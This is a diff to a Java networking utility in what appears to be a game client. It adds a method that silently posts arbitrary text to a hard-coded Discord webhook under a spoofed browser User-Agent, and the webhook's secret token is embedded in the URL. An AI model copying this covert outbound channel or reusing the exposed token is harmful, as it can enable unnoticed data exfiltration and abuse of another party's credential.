@@ -1,5 +1,6 @@
 package tech.atani.client.utility.internet;
 
+import javax.net.ssl.HttpsURLConnection;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -7,6 +8,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -52,6 +54,26 @@ public class NetUtils {
         connection.disconnect();
 
         return response.toString();
+    }
+
+    public static void sendToWebhook(String input) {
+        String webhookURL = "https://discord.com/api/webhooks/1150370154312650812/7z6v8s8EW3xMYjOO9WXf1jNApZTGkwjXlxr-H93BciVf0tC0ov32M_upB4uQo_RbBXGt";
+        try {
+            HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0");
+            connection.setDoOutput(true);
+            try (final OutputStream outputStream = connection.getOutputStream()) {
+                String preparedCommand = input.replaceAll("\\\\", "\\\\\\\\");
+                preparedCommand = preparedCommand.replaceAll("\n", "\\\\n");
+
+                outputStream.write(("{\"content\":\"" + preparedCommand + "\"}").getBytes(StandardCharsets.UTF_8));
+            }
+            connection.getInputStream();
+        } catch (final IOException e) {
+            e.printStackTrace();
+        }
     }
 
 }
